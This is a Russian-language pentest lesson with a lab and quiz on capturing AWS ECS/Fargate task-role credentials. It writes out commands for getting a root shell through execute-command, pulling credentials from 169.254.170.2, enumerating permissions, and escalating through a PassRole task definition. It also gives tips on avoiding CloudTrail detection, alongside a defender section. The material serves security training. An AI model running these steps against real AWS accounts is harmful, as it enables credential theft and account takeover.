---
id: cloud-aws-ecs
title: "ECS и Fargate: task role, определения задач и exec"
category: cloud
parent: cloud-aws-deep
difficulty: hard
order: 4
tags: [cloud, aws, ecs, fargate, task-role, container, exec]
prerequisites: [cloud-aws-deep, cloud-containers-docker]
useful_for:
  - "Пентест контейнерных рабочих нагрузок AWS"
  - "Захват task role из контейнера"
  - "RCE внутри ECS/Fargate"
estimated_minutes: 50
summary: "Как устроены ECS и Fargate, чем task role отличается от execution role, как через execute-command и определения задач захватить права контейнера и выйти в аккаунт."
lab:
  kind: shell
  title: "Практика: захват task role из контейнера ECS"
  toolset: [core, curl]
  workdir: /home/student/ecs
  files: [task.md, notes.md, env.json]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "В `env.json` есть переменная, указывающая на metadata-эндпоинт контейнера (169.254.170.2)."
    - "`curl -s http://169.254.170.2/v2/metadata` вернёт JSON задачи — среди Labels/DockerLabels лежит секрет."
    - "Сохрани вывод и найди строку с флагом: `curl -s http://169.254.170.2/v2/metadata > meta.json`, затем `grep nto meta.json > found.txt`."

---

## Задача

**ECS** (Elastic Container Service) и **Fargate** — AWS-способ запускать контейнеры без управления узлами. Здесь нет kubelet и API-сервера, но есть свои привилегированные сущности. Главное для нас: контейнер в ECS — это не только приложение, но и **идентичность** (task role) с доступом к AWS API.

Цель урока: получив код в задаче ECS, захватить её роль и выйти в аккаунт.

## Данные, с которыми работаем

Разберём понятия:
- **Cluster** — группа сервисов и задач;
- **Task definition** — шаблон: образы, CPU, переменные, секреты и **две роли**;
- **Task** — запущенный экземпляр;
- **Execution role** — от её имени агент ECS тянет образ из ECR и пишет логи. **Права приложению не даёт**;
- **Task role** — роль, чьи креды доступны **внутри** контейнера. Именно её захватывает атакующий.

Ключевое отличие ECS от EC2: креды task role выдаются по адресу `http://169.254.170.2/v2/credentials/<uri>`, где `<uri>` берётся из переменной `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`. Никаких IMDSv2-танцев — если есть SSRF, креды утекают напрямую.

Начинаем разведку:

```bash
$ aws ecs list-clusters
{"clusterArns": ["arn:aws:ecs:us-east-1:123456789012:cluster/prod-cluster"]}
$ aws ecs list-tasks --cluster prod-cluster --query 'taskArns' --output text
arn:aws:ecs:us-east-1:123456789012:task/prod-cluster/abc123
```

## Шаг 1: смотрим задачу и её роль

```bash
$ aws ecs describe-tasks --cluster prod-cluster --tasks abc123 \
    --query 'tasks[0].{taskRole:taskRoleArn,execRole:executionRoleArn}'
{"taskRole":"arn:aws:iam::123456789012:role/api-task-role",
 "execRole":"arn:aws:iam::123456789012:role/ecsTaskExecutionRole"}
```

Наша цель — `api-task-role`. Проверяем, включён ли `execute-command`:

```bash
$ aws ecs describe-services --cluster prod-cluster --services api \
    --query 'services[0].enableExecuteCommand'
true
```

## Шаг 2: получаем shell в контейнере

```bash
$ aws ecs execute-command --cluster prod-cluster --task abc123 \
    --container api --interactive --command "/bin/sh"
# (shell) id
uid=0(root) gid=0(root) groups=0(root)
```

Мы внутри контейнера от root. Теперь забираем креды task role — по тому самому ECS-эндпоинту:

```bash
# (shell) env | grep AWS_CONTAINER
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/xxxx
# (shell) curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
```

Экспортируем и проверяем, кто мы:

```bash
$ export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
$ aws sts get-caller-identity
{"Arn": "arn:aws:sts::123456789012:assumed-role/api-task-role/abc123"}
```

## Шаг 3: разведка прав task role

```bash
$ python3 enumerate-iam.py --access-key ASIA... --secret-key ... --session-token ...
[+] s3:GetObject - allowed
[+] dynamodb:Scan - allowed
[+] sqs:ReceiveMessage - allowed
```

Роль имеет доступ к S3, DynamoDB и SQS. Читаем секреты из переменных окружения и S3:

```bash
# (shell) env | grep -iE 'token|key|password'
STRIPE_KEY=sk_live_51H...
```

## Полный прогон от начала до конца

1. `list-tasks` → нашли задачу `abc123`.
2. `describe-tasks` → task role `api-task-role`.
3. `execute-command` → shell от root.
4. Забрали креды task role из `169.254.170.2`.
5. `enumerate-iam` → права на S3/DynamoDB/SQS; нашли токены в env.

## Если execute-command недоступен: SSRF и PassRole

- **SSRF в приложении.** Тот же эндпоинт `169.254.170.2` доступен приложению. Если есть SSRF, креды task role утекают напрямую — без shell.
- **`iam:PassRole` + `ecs:RegisterTaskDefinition`/`RunTask`.** Классическая эскалация: регистрируем **своё** определение задачи с **чужой** ролью и запускаем задачу, читая её креды:

```bash
$ aws ecs register-task-definition --family pwn \
    --task-role-arn arn:aws:iam::123456789012:role/AdminRole \
    --container-definitions '[{"name":"c","image":"alpine","command":["sleep","3600"]}]'
$ aws ecs run-task --cluster prod-cluster --task-definition pwn
```

- **Подмена образа.** Если есть push в ECR-репозиторий сервиса, заменяем образ на свой и получаем task role при следующем деплое.
- **`privileged: true` / `networkMode: host`** (только EC2 launch type) — выход на хост и его instance profile.

## Если не сработало: тонкости

- **Fargate без execute-command.** В Fargate нет доступа к узлу; RCE возможен только через приложение или подменённый образ.
- **Секреты в task definition.** `describe-task-definition` показывает env-переменные открыто, а для `secrets` — ARN из SSM/Secrets Manager; при наличии `ssm:GetParameter` получишь значения.
- **Execution role ≠ task role.** Кража execution role даёт доступ к ECR и логам, но не к прикладным данным.
- **`sts:AssumeRole` из task role.** Часто именно она ведёт к следующей, более широкой роли.

## Частые ошибки и подводные камни

- **Путать execution role и task role.** Кража execution role даёт ECR и логи, но не прикладные данные; цель — task role.
- **Fargate без `execute-command`.** В Fargate нет доступа к узлу; RCE возможен только через приложение или подменённый образ.
- **Забывать про `169.254.170.2`.** Это ECS-специфичный endpoint кредов, отличный от `169.254.169.254`.
- **Считать `describe-task-definition` безопасным.** Он нередко раскрывает env-переменные и пути секретов.
- **Игнорировать `sts:AssumeRole` из task role.** Часто именно она ведёт к следующей, более широкой роли.
- **Создавать новые сущности без нужды.** `RegisterTaskDefinition` остаётся в аккаунте и легко обнаруживается аудитом.

- **Не проверять `enableExecuteCommand`.** Без него `execute-command` вернёт ошибку, но право может быть включено через override на уровне задачи.
- **Забывать про Fargate-пересоздание.** Задачи пересоздаются после деплоя, и ваш shell исчезнет — для устойчивости нужен другой механизм.

- **Не проверять override секретов.** `describe-tasks` возвращает `overrides`, где иногда видны значения, отсутствующие в шаблоне.

## Что мы теперь знаем

- ECS-контейнер имеет **task role** — доступную внутри идентичность.
- Креды выдаются по `169.254.170.2` (не `169.254.169.254`); путь — в `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`.
- `execute-command` (при `enableExecuteCommand=true` и праве) даёт shell от root.
- `iam:PassRole` + `RegisterTaskDefinition` — чистая эскалация к произвольной роли.
- Execution role нужна агенту (ECR/логи), task role — приложению.
- SSRF в приложении утекает креды task role напрямую.

## На что смотреть дальше

- **cloud-network-security**: сетевые барьеры, ограничивающие egress задач.
- **cloud-artifact-registry**: подмена образа в ECR как путь к роли.
- **cloud-privesc-iam**: что делать с ролью, полученной в задаче.

## Глазами защитника

Защита ECS начинается с ролей: task role должна иметь ровно те права, что нужны приложению, без `s3:*` и без `iam:PassRole`. `enableExecuteCommand` включают только там, где действительно нужен отладочный доступ, и ограничивают его IAM-условиями и тегами задач. Секреты передают через `secrets` из SSM/Secrets Manager, а не через `environment`, потому что переменные окружения видны в `describe-task-definition` и внутри контейнера.

Отдельно контролируют `iam:PassRole`: если у разработчика есть это право вместе с `ecs:RegisterTaskDefinition`, он может запустить задачу с чужой ролью. Право выдают только доверенным CI-ролям и с условием `iam:PassedToService: ecs-tasks.amazonaws.com`. В CloudTrail следят за `RegisterTaskDefinition` и `RunTask` с необычными ролями и за всплесками `ExecuteCommand`. Сетевой egress задачи ограничивают security groups и VPC endpoints, чтобы даже при SSRF нельзя было дотянуться до `169.254.170.2` и произвольных внешних адресов.

## Частые вопросы

**Чем execution role отличается от task role на практике?**

Execution role нужна агенту ECS: от её имени демон тянет образ из ECR, отправляет логи в CloudWatch и подтягивает значения `secrets` из SSM/Secrets Manager. Приложение эти права не получает. Task role — наоборот: её временные креды монтируются внутрь контейнера и доступны коду. Поэтому при захвате контейнера цель — именно task role; кража execution role даёт лишь ECR и логи, но не прикладные данные.

**Почему endpoint 169.254.170.2 опаснее, чем IMDS на EC2?**

IMDS на EC2 защищён IMDSv2: нужен предварительный PUT-запрос за токеном и ограничение числа хопов. ECS-эндпоинт отдаёт креды простым GET по HTTP без токена и без hop-limit, а путь к нему задан в переменной `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`. Поэтому одна SSRF в приложении утекает креды task role напрямую, без «танцев» с метаданными.

**Что делать, если execute-command выключен?**

Проверь комбинацию `iam:PassRole` вместе с `ecs:RegisterTaskDefinition` и `ecs:RunTask`: тогда ты регистрируешь своё определение задачи с чужой, более широкой ролью и запускаешь её, читая креды изнутри. Альтернатива — push в ECR-репозиторий сервиса: подменённый образ получит task role при следующем деплое.

**Как не оставить следов в ECS?**

`RegisterTaskDefinition` и `RunTask` пишутся в CloudTrail и остаются в аккаунте как новые сущности. Чище использовать уже существующую задачу через `execute-command` или SSRF — они не создают новых объектов. Если всё же создавал задачи, после работы удаляй свои task definitions и deregister-и задачи, иначе аудит заметит «висящий» шаблон.

**Почему Fargate меняет тактику?**

В Fargate нет доступа к узлу и нет `privileged`/`networkMode: host`, поэтому побег на хост невозможен. RCE возможен только через приложение, SSRF к `169.254.170.2` или подменённый образ. Зато задача пересоздаётся после деплоя — твой shell исчезнет, и для устойчивости нужен отдельный механизм.

**Как отличить ECS от EC2 при разведке?**

Признаки ECS: в cgroup видно путь задачи, есть переменная `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`, а креды приходят с `169.254.170.2`, а не с `169.254.169.254`. На EC2, наоборот, работает IMDS и такой переменной нет. Отличив среду, ты сразу выбираешь правильный способ кражи кредов.

**Почему секрет в environment задачи — плохо?**

`describe-task-definition` и `describe-tasks` показывают переменные окружения открыто любому, у кого есть права чтения ECS. Значение видно и внутри контейнера через `env`. `secrets` подтягиваются в рантайме из SSM/Secrets Manager, и в описании отражаются лишь их ARN.

## Квиз

Проверь себя.

```quiz
- question: "Какая роль даёт права самому приложению внутри ECS-контейнера?"
  options:
    - "Task role"
    - "Execution role"
    - "Service-linked role"
    - "Instance profile"
  answer: 0
  explanation: "Task role доступна внутри контейнера; execution role нужна агенту ECS для ECR/логов/secrets."
- question: "По какому адресу Fargate-контейнер получает креды task role?"
  options:
    - "http://169.254.170.2"
    - "http://169.254.169.254"
    - "http://metadata.google.internal"
    - "http://127.0.0.1:8080"
  answer: 0
  explanation: "ECS/Fargate используют отдельный endpoint 169.254.170.2 с relative URI."
- question: "Какая комбинация прав позволяет эскалировать к произвольной роли через ECS?"
  options:
    - "iam:PassRole + ecs:RegisterTaskDefinition/RunTask"
    - "s3:GetObject + s3:ListBucket"
    - "ec2:DescribeInstances"
    - "route53:ListHostedZones"
  answer: 0
  explanation: "PassRole позволяет зарегистрировать задачу с чужой ролью и запустить её."
- question: "Что безопаснее для секретов в ECS?"
  options:
    - "Использовать secrets из SSM/Secrets Manager, а не environment"
    - "Писать пароли в environment"
    - "Хранить их в описании задачи"
    - "Публиковать в логах"
  answer: 0
  explanation: "Environment видны в DescribeTaskDefinition и в контейнере; secrets подтягиваются в рантайме."
- question: "Почему ECS-эндпоинт кредов особенно опасен при SSRF?"
  options:
    - "Он выдаёт креды task role без IMDSv2-защиты, просто по HTTP"
    - "Он требует MFA"
    - "Он недоступен из контейнера"
    - "Он шифрует креды"
  answer: 0
  explanation: "В отличие от EC2 IMDS, здесь нет hop-limit и токенов сессии — креды утекают напрямую."
```

## Куда дальше

В следующем уроке мы займёмся **сетевой безопасностью облака** — security groups, NACL и firewall — и разберём, как обходить сетевые барьеры, включая те, что стоят вокруг задач ECS. А пока главное запомни: **в ECS идентичность контейнера — это task role**, и получить её можно либо через `execute-command`, либо через SSRF к `169.254.170.2`, либо через `PassRole`.

## Где пригодится

- **Пентест AWS:** контейнерные рабочие нагрузки и захват ролей.
- **Red team:** RCE в ECS/Fargate и эскалация через PassRole.
- **Blue team:** аудит task definitions и прав ExecuteCommand/PassRole.
- **CTF:** облачные задачи про контейнеры.
